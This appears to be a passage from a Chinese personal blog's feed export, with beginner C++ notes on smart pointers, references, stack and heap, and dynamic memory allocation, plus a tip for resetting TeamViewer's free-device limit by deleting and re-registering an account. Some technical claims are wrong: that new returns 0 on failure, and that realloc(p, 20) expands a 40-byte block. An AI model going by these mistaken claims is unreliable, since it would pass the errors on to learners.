class=""><p>先初始化了智能指针的值为0，p在指向智能指针<br>然后通过*p&#x3D;500也是成功修改了智能指针的值。</p><hr><h2 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h2><p>release会返回unique_ptr的指针将其置为nullptr，但是release不会释放占用的内存空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">intP.<span class="built_in">release</span>();</span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/007.png" class=""><p><strong>虽然release将智能指针的地址置为nullptr了，但是我们说过，原先的内存没有释放掉，而且release会返回原先智能指针的地址</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">p = intP.<span class="built_in">release</span>();</span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/008.png" class=""><p>这样就可以看出没release之前intP的地址和release之后的结果。包括p接收了release返回的地址。</p><hr><h2 id="转移"><a href="#转移" class="headerlink" title="转移"></a>转移</h2><p>智能指针具有唯一性是上述提到过的。所以智能指针不能够被复制，但是有转移的方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; intP2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">intP2 = std::<span class="built_in">move</span>(intP);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; intP2 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/009.png" class=""><p>看到intP被转移后地址被置为nullptr，intP2则获取了intP原先的地址。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这玩意目前还不知道应用场景在哪，毕竟不太习惯。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointer浅挖</title>
      <link href="/2022/05/12/pointerP/"/>
      <url>/2022/05/12/pointerP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>指针和数组还有很多知识点需要学习</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="sizeof-数组"><a href="#sizeof-数组" class="headerlink" title="sizeof(数组)"></a>sizeof(数组)</h2><p>大部分情况下，我们使用sizeof()，编译器都是需要一个运行过程的。<br>而我们反汇编sizeof求数组大小的时候会发现不一样的点：</p><img src="/2022/05/12/pointerP/000.png" class=""><p>能看到反汇编后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">sizeof</span>(ch);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>头两句只有一句反汇编代码，首先也是因为数组没有初始化。<br>其次就是他调用数组大小是20，编译器仿佛知道这个数组的大小了，14h也就是十六进制的写法，换算成十进制也就是20，数组有五个成员*4正好就是20。</p><p><strong>也就是之前说的，数组的底层实现是由指针实现的，数组本身是抽象的结构逻辑</strong><br>所以编译器会提前预览出数组的大小，以便后续使用。</p><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用是一种阉割的指针版本。<br>虽然取址引用变量得到的是原值的内存地址，但是引用的变量本身也占用内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">a = <span class="number">6</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br><span class="line"><span class="type">int</span> &amp;c = a;</span><br><span class="line"><span class="type">int</span> *d = &amp;a;</span><br><span class="line">b = <span class="number">6</span>;</span><br><span class="line">c = <span class="number">6</span>;</span><br><span class="line">*d = <span class="number">6</span>;</span><br><span class="line">a = (<span class="type">int</span>)&amp;a;</span><br></pre></td></tr></table></figure><p>反汇编后看到：<img src="/2022/05/12/pointerP/001.png" class=""></p><ol><li>a的地址就是ebp-Ch</li><li>b的地址是ebp-18<br>在代码里我们看到&amp;b&#x3D;a之前，先将a的地址赋予eax，然后再将eax赋予b的地址上<br>这就说明了引用变量确实占用了内存。</li><li>c的地址就是ebp-24</li><li>d的地址就是ebp-30</li><li>b&#x3D;6的时候，先将b的地址的值赋给eax，引用b的地址在上述操作中为a的地址</li><li>c&#x3D;6和*d&#x3D;6 发现步骤相同，区别就在于各自的内存地址不一样。不过也印证引用和指针的关联性。</li></ol><hr><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><p>空间分配：</p><ol><li>栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。</li><li>堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收，分配方式倒是类似于链表。</li></ol><p>百度而来的浅显答案。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"><span class="type">int</span> *d = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;c &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; d &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/05/12/pointerP/002.png" class=""><br>可以看到abc三个变量的地址离得很近，但是d却很远，d现在打印的地址是new出来的，我们捎上变量d本身的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;c &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;d &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; d &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/12/pointerP/003.png" class=""><p>能看到d变量本身占用的内存地址里abc都是比较近的，因为他们都是挨着声明的，内存地址由计算机分配而来，也就是说这些变量的内存地址存放在栈区。<br>而new出来的那块内存则符合定义中由人为分配的，处于堆区。</p><p><strong>栈区是程序在编译时就确定了大小的一段内存区域，主要用于存放临时变量，其效率也会高于堆，但是因为事先就确定了大小，导致了容量有限的问题，当然可以在编译前指定栈的大小，不过涉及到的东西有点多</strong></p><p>另外就是栈比较有意思的是，他的结构是自上向下的结构，遵循先入后出顺序。</p><img src="/2022/05/12/pointerP/004.png" class=""><p>随便画张草图理解一下。<br>ebp通过地址减去得到变量的地址。当变量的声明周期全部结束了的时候，ebp的地址就会和esp一样了</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>主要是浅看指针和数组和引用的关系，然后就是顺便理解堆栈的概念，因为反汇编多次出现了，总要先looklook。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>teamviewer设备上限</title>
      <link href="/2022/05/11/teamvieweruser/"/>
      <url>/2022/05/11/teamvieweruser/</url>
      
        <content type="html"><![CDATA[<h1 id="teamviewer设备上限"><a href="#teamviewer设备上限" class="headerlink" title="teamviewer设备上限"></a>teamviewer设备上限</h1><span id="more"></span><p>远程桌面软件只接触过向日癸和teamviewer两种，但后面实际上tv用的比较多。<br>但商业是收费的，个人用限制设备。<br>以前也是零零散散登录过几次，没太注意，这次换了电脑重新安装提示免费设备到限制了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先进入<a href="https://login.teamviewer.com/nav/home">官网</a><br>第一次在新设备上登录还要邮箱重新验证</p><p>登陆进去之后看到左上角</p><img src="/2022/05/11/teamvieweruser/000.jpg" class=""><p>点击配置文件进入后，找到免费设备</p><img src="/2022/05/11/teamvieweruser/001.jpg" class=""><blockquote><p>值得注意的是剩余更次数默认只有两次</p></blockquote><p>如果非特殊情况。在登陆到其他设备时可以选择仅使用一次而不是信任该设备，假设真的真的没次数的话，那就建议新建个账号了。如果没有这么多邮箱电话什么的</p><p>可以在编辑配置文件中右边看到删除账户</p><img src="/2022/05/11/teamvieweruser/002.jpg" class=""><p>据说删除了之后还可以使用原来的邮箱重新注册，然后之前的设备限制又变成了两台。。还蛮有意思的。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>结束</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>quote</title>
      <link href="/2022/05/10/quote/"/>
      <url>/2022/05/10/quote/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>引用看起来会很突兀，因为&amp;符号<br>引用的语法是：<code>数据类型 &amp;变量名称 = 引用对象名称</code></p><p>例如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用之后，我们对b进行的操作，其实都是变相对a进行了操作</span></span><br><span class="line">b = <span class="number">200</span>;    <span class="comment">//那么a的值就会 = 200；</span></span><br></pre></td></tr></table></figure><p><strong>当然引用可以有多个，比如我再新建b1，b2，b3，都可以引用变量a</strong></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br><span class="line"><span class="type">int</span> &amp;b2 = a;</span><br><span class="line"><span class="type">int</span> &amp;b3 = a;</span><br><span class="line"></span><br><span class="line">b3++;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b3 &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/10/quote/000.png" class=""><p>再看看它们的地址: <img src="/2022/05/10/quote/001.png" class=""><br>发现地址一模一样，这样看上去引用好像有点拉跨。</p><p>但是放在别的情况下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x : a)&#123;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x : a)&#123;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/10/quote/002.png" class=""><p>这个时候x只是作为一个调用的变量，x的自增，不会改变a的元素，如果把x作为引用：</p><img src="/2022/05/10/quote/002.png" class="">就能看到a的元素都递增了。<blockquote><p>虽然在这个例子中，感受不到引用带来的速度变化，但实际作用中还是很可观的。</p></blockquote><hr><h2 id="引用的小毛病"><a href="#引用的小毛病" class="headerlink" title="引用的小毛病"></a>引用的小毛病</h2><p>当一个引用初始化后，又想改变引用的对象了，但是这个对象已经是代表之前引用的对象了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> &amp;c = &amp;a;</span><br><span class="line">c = b; <span class="comment">//这里的c已经是代表a了，c=b，就是相当于a=b，是非常不可取的</span></span><br></pre></td></tr></table></figure><blockquote><p>在现有手段中，我们知道常量是不可变的。为了保险可以使用const</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;c = a;</span><br><span class="line">c = b; <span class="comment">//这里就会报错了。</span></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>初次体验引用还是比较容易接受的。等到和函数混合用的时候或许会上一档次。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针动态内存分配</title>
      <link href="/2022/05/07/dynamicsmemory/"/>
      <url>/2022/05/07/dynamicsmemory/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在正常情况下，声明一个数组时<code>type arrayName [arraySize]</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//就是将是个成员全部初始化为0</span></span><br><span class="line"><span class="type">int</span> ch2[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;; <span class="comment">//没指定大小，但是有初始化，那么数组的大小就会根据初始化成员个数而定</span></span><br></pre></td></tr></table></figure><span id="more"></span><p>还有一种情况就是arraySize是const类型或者#define，因为在规范里定义了，声明数组大小的时候必须是常量表达式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[N] = &#123; <span class="number">0</span> &#125;;  <span class="comment">//合法，N是常量</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> ch2[a] = &#123; <span class="number">0</span> &#125;; <span class="comment">//合法，a是常量</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> ch3[b] = &#123; <span class="number">0</span> &#125;; <span class="comment">//不合法，b是一个变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/000.png" class=""><p>至于为什么不能是变量，放到最后再说。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>这就不得不提c语言的malloc函数了<code>void* malloc(size_t size)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//malloc 是向计算机申请一片内存使用，所以参数为type*typesize</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>); <span class="comment">//sizeof(type)更加直观，当然熟记类型大小也问题不大，就是怕在32位和64位下有区别，建议保守使用sizeof获取变量类型大小</span></span><br><span class="line"><span class="comment">//然后就是如何使用这片内存，学过指针，所以我们会将地址抛给指针</span></span><br><span class="line"><span class="type">int</span> *p = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>); <span class="comment">//这里会提示类型不符合，因为malloc原型是void*，所以需要强制转换</span></span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">p[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">p[<span class="number">2</span>] = <span class="number">1</span>*<span class="number">2</span>;</span><br><span class="line"><span class="comment">//都是合法的，[前提是不超过分配的内存大小]，这个在指针那里就说过了为什么合法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>当然，malloc如果没有申请到内存就会返回0，指针得到的结果也就为0</strong></p><hr><h2 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h2><p><code>void * calloc(size_t count,size_t size)</code><br>差别到不是太大，就是两个形参，一个是个数，一个是类型大小。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">10</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">10</span>,<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="comment">//当然10可以用变量代替</span></span><br></pre></td></tr></table></figure><p><strong>同样的，如果没有成功分配到内存，返回也是0，好处是calloc分配完内存后会进行初始化，而malloc则没有这么贴心</strong></p><hr><h2 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h2><p>re可能就会联想到重新,realloc就是重新分配内存<br><code>void* realloc(voir* _Block, size_t_size)</code></p><blockquote><p>先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。<br>——摘自百度百科</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">10</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">p = (<span class="type">int</span>*)<span class="built_in">realloc</span>(p, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/001.png" class=""><blockquote><p>这里可以看到经过扩容之后的内存，起始位置发生了改变，但是原本p[0]上的1还是存在</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">10</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> *p2 = p;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">p = (<span class="type">int</span>*)<span class="built_in">realloc</span>(p, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>然后改成缩小，并且用一个指针先记录p原先的地址，在realloc前后各打印一次</p><img src="/2022/05/07/dynamicsmemory/002.png" class=""><blockquote><p>可以看到经过realloc之后指针p的首地址发生了改变。符号百度的情况</p></blockquote><p>但是上述两种都是基于x64编译的，试了下x86编译的，发现不论是扩大还是缩小，内存首地址居然没变化</p><img src="/2022/05/07/dynamicsmemory/003.png" class=""><p>起初还以为是vs2022做了什么优化，又用了clion试了一下：</p><img src="/2022/05/07/dynamicsmemory/004.png" class=""><blockquote><p>发现好像是malloc的不够大，超过好几倍的时候才会申请新的空间拖拽，不然就是首地址往后或者前操作。</p></blockquote><p>回到vs2022上,将<code>p = (int*)realloc(p, 200);</code>修改成200。</p><img src="/2022/05/07/dynamicsmemory/005.png" class=""><p>能够看到p的地址果然发生改变了。</p><img src="/2022/05/07/dynamicsmemory/006.png" class=""><p>由大缩小后首地址不变。</p><p>x64下同理：<img src="/2022/05/07/dynamicsmemory/007.png" class=""></p><p><strong>那么malloc就符合之前的描述：当内存足够时，realloc的内存&#x3D;原本内存+剩余内存，当内存不够时，realloc会申请新的内存并将原来的内存拷贝到新内存里，旧的将被free掉。</strong></p><hr><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p><code>void free(void* _Block)</code>,_Block就是要释放的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">free</span>(p); </span><br><span class="line"><span class="comment">//free完之后，原本的指针会变成悬挂指针也叫野指针，因为它现在没法用了</span></span><br><span class="line"><span class="comment">//常见情况下就是要么指针没有初始化，要么指针的对象生命周期到了，也就是局部变量离开作用域后失效</span></span><br><span class="line"><span class="comment">//还有一种就是free完之后，尽量将指针置空或者置零。</span></span><br><span class="line">p = <span class="literal">NULL</span>; <span class="comment">//或者=0,以后处理的工作大了也可以定义一个宏或者函数去处理这种事件</span></span><br></pre></td></tr></table></figure><p>但是连续free一块内存空间是会出点毛病的，具体要看编译器怎么处理了。</p><hr><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p><code>数据类型 *变量名 = new 数据类型：int *p = new int;</code><br><code>数据类型 *变量名 = new 数据类型[arraySize]: int *p = new int[5];</code></p><blockquote><p>老规矩分配失败返回0</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="type">int</span> *p2 = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实底层还是malloc那套，我们随便打个断点反汇编进去，一步步看：</p><img src="/2022/05/07/dynamicsmemory/008.png" class=""><p>所以万变不离其宗，封装再好，也能看到底层，我们也能模仿造轮子。</p><p>其次就是之前说过的，动态分配的内存，都需要我们手动释放，malloc那些用free，而new 对应的时delete</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">delete</span> p2;<span class="comment">//p2是分配了五个int类型的内存，所以这里会产生警告，不然你只是delete掉p2首地址</span></span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/009.png" class=""><p>所以数组需要加上[]消除，<code>delete []p2</code></p><img src="/2022/05/07/dynamicsmemory/010.png" class=""><p>可以看到程序没有报错和警告。</p><hr><h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><h3 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h3><p>前面提到过的悬挂指针问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span 